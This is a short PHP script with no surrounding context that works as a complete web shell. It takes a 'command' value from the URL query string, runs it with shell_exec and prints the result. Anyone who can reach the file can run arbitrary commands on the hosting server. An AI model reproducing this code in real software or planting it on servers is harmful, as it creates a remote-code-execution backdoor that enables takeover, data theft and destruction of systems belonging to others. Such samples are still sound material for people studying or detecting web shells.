
<?php

$command = $_GET['command'];
$output = shell_exec($command);

echo $output;

?>
